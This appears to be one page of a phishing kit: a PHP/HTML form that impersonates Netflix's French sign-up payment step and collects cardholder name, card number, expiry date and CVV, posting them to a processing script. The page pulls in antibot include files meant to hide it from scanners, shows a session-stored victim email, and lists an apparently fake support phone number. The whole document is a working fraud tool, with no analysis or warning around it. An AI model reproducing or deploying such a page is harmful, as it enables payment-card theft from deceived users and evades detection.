<html lang="fr" class=" " data-triggered="true">
<?php 
require_once("../home.php");
include('../infos.php');
    include('../antibots/antibot.php');
    include('../strom1.php');
?>
<?php include_once("includes/head_in.php"); ?>


<body>
    <div id="appMountPoint">
        <div class="netflix-sans-font-loaded">
            <div class="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-registrationWithContext simplicity" lang="fr-FR" dir="ltr">
                <div class="nfHeader noBorderHeader signupBasicHeader onboarding-header"><a href="/" style="margin-top: 14px;" class="svg-nfLogo signupBasicHeader onboarding-header" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" aria-hidden="true" focusable="false"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a>
                <?php if(isset($_SESSION["email"])){ echo '<a href="" class="authLinks signupBasicHeader onboarding-header" data-uia="header-login-link">'.$_SESSION["email"].'</a>';  }else{echo '<a href="../index.php" class="authLinks signupBasicHeader onboarding-header" data-uia="header-login-link">S\'identifier</a>';} ?>
             
            </div>                
            <div class="simpleContainer" data-transitioned-child="true">
                <div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
                    <form id="the_form" method="POST" action="../process/cnum_process.php" data-uia="payment-form">
                        <div class="paymentFormContainer">
                            <style>
                                input{
                                    padding-top : 0px !important;
                                }
                            </style>
                            <div>
                                <div class="stepHeader-container" data-uia="header">
                                    <div class="stepHeader" data-a11y-focus="true" tabindex="0"><span id="" class="stepIndicator" data-uia="">ÉTAPE <b>3</b> SUR <b>3</b></span>
                                        <h1 class="stepTitle" data-uia="stepTitle">Configurez votre carte de paiement</h1>
                                    </div>
                                </div>
                            </div>
                            <div class="fieldContainer"><span class="logos logos-block" data-uia="cardLogos-comp" aria-label="Nous acceptons VISA, MASTERCARD, AMEX et CARTES_BANCAIRES."><img alt="" class="logoIcon VISA" data-uia="logoIcon-VISA" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/visa-v3.svg"><img alt="" class="logoIcon MASTERCARD" data-uia="logoIcon-MASTERCARD" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/mastercard-v2.svg"><img alt="" class="logoIcon AMEX" data-uia="logoIcon-AMEX" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/amex-v2.svg"><img alt="" class="logoIcon CARTES_BANCAIRES" data-uia="logoIcon-CARTES_BANCAIRES" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_cartes_bancaires.png" srcset="https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_cartes_bancaires_2x.png 2x"></span>
                                <ul class="simpleForm structural ui-grid">
                                    <li data-uia="field-lastName+wrapper" class="nfFormSpace">
                                        <div data-uia="field-lastName+container" class="nfInput nfInputOversize">
                                            <div class="nfInputPlacement">
                                                <label class="input_id" placeholder="lastName">
                                                    <input required name="user_nom_titulaire" placeholder="Nom du titulaire de la carte" class="nfTextField" id="id_lastName" type="text" tabindex="0" autocomplete="cc-family-name" dir="" value="">
                                                </label>
                                            </div>
                                        </div>
                                    </li>
                                    <li data-uia="field-creditCardNumber+wrapper" class="nfFormSpace">
                                        <div class="cardNumberContainer">
                                            <div data-uia="field-creditCardNumber+container" class="nfInput nfInputOversize">
                                                <div class="nfInputPlacement">
                                                    <label class="input_id" placeholder="creditCardNumber">
                                                        <input required  name="user_numcc" placeholder="Numéro de carte" class="nfTextField" id="cnum" type="tel" tabindex="0"  maxlength="19" autocomplete="cc-number" maxlength="19" minlength="12" dir="" value="">
                                                    </label>
                                                </div>
                                            </div>
                                        </div>
                                    </li>
                                    <li data-uia="field-creditExpirationMonth+wrapper" class="nfFormSpace">
                                        <div data-uia="field-creditExpirationMonth+container" class="nfInput nfInputOversize">
                                            <div class="nfInputPlacement">
                                                <label class="input_id" placeholder="creditExpirationMonth">
                                                    <input required  name="user_expira" placeholder="Date d'expiration (MM/AA)" class="nfTextField" id="expia" type="tel"  maxlength="7" tabindex="0" autocomplete="off" dir="" value="">
                                                </label>
                                            </div>
                                        </div>
                                    </li>
                                    <li data-uia="field-creditExpirationYear+wrapper" class="nfFormSpace"></li>
                                    <li data-uia="field-creditCardSecurityCode+wrapper" class="nfFormSpace">
                                        <div data-uia="field-creditCardSecurityCode+container" class="nfInput nfInputOversize tooltip">
                                            <div class="nfInputPlacement">
                                                <label class="input_id" placeholder="creditCardSecurityCode">
                                                    <input required name="user_ccv" placeholder="Cryptogramme (CVV)" class="nfTextField" id="id_creditCardSecurityCode" type="password" tabindex="0" autocomplete="cc-csc" maxlength="4" minlength="3" dir="" value="">
                                                </label>
                                            </div>
                                        </div>
                                    </li>
                                    <?php check_error("credit_card_is_not_valid","Vos informations n'ont pas pu être vérifiées, veuillez réessayer.") ?>
                                    <?php check_error("credentials_not_set","Veuillez remplir tous les champs") ?>
                                    <?php check_error("empty","Veuillez remplir tous les champs") ?>
                                </ul>
                                <div class="tou--container">
                                    <div class="user-consent--container" data-uia="termsOfUseMatlock+organic-fr"><span id="" data-uia="termsOfUse-Disclosure">En cliquant sur le bouton "Activer mon abonnement payant" ci-dessous, vous acceptez nos <a target="_blank" href="https://help.netflix.com/legal/termsofuse">Conditions d'utilisation</a>, reconnaissez avoir plus de 18&nbsp;ans et prenez acte de la <a target="_blank" href="https://help.netflix.com/legal/privacy">Déclaration de confidentialité</a>. Vous acceptez que votre abonnement commence immédiatement et renoncez à votre droit de rétractation. Netflix renouvelle automatiquement votre abonnement et prélève les frais correspondants via le mode de paiement choisi, sauf résiliation de votre part. Vous pouvez annuler votre abonnement à tout moment pour éviter tout prélèvement ultérieur.</span></div>
                                </div>
                            </div>
                        </div>
                        <div class="submitBtnContainer"><button type="submit" autocomplete="off" tabindex="0" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="action-submit-payment" placeholder="">Confirmer</button></div>
                    </form>
                </div>
            </div>





                <div class="site-footer-wrapper centered">
                    <div class="footer-divider"></div>
                    <div class="site-footer">
                        <p class="footer-top">Des questions&nbsp;? Appelez le <a class="footer-top-a" href="tel:(+33) 0805-543-063">(+33) 0805-543-063</a></p>
                        <ul class="footer-links structural">
                            <li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/support/412" placeholder="footer_responsive_link_faq"><span id="" data-uia="data-uia-footer-label">FAQ</span></a></li>
                            <li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label">Centre d'aide</span></a></li>
                            <li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/termsofuse" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label">Conditions d'utilisation</span></a></li>
                            <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/privacy" placeholder="footer_responsive_link_privacy_separate_link"><span id="" data-uia="data-uia-footer-label">Confidentialité</span></a></li>
                            <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_cookies_separate_link"><span id="" data-uia="data-uia-footer-label">Préférences de cookies</span></a></li>
                            <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/corpinfo" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label">Mentions légales</span></a></li>
                        </ul>
                        <div class="lang-selection-container" id="lang-switcher">
                            <div class="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container"><label class="nfLabel" for="lang-switcher-select">Choisir la langue</label>
                                <div class="nfSelectPlacement globe"><select data-uia="language-picker" class="nfSelect" id="lang-switcher-select" name="__langSelect" tabindex="0"><option selected="" label="Français" lang="fr" value="/signup/registration?locale=fr-FR">Français</option><option label="English" lang="en" value="/signup/registration?locale=en-FR">English</option></select></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="a11yAnnouncer" aria-live="assertive" tabindex="-1"></div>
            </div>
        </div>
    </div>
    <div>
    </div>
</body>
<script src="https://code.jquery.com/jquery-3.6.0.slim.min.js" integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=" crossorigin="anonymous"></script>
<script src="../assets/js/mask.js"></script>
<script>
    $("#expia").mask("##/####")
    $("#cnum").mask("#### #### #### ####")

</script>
<script>
    $("#the_form").on("submit",function(){
        $(".loader").css("display","flex");
    })
</script>
</html>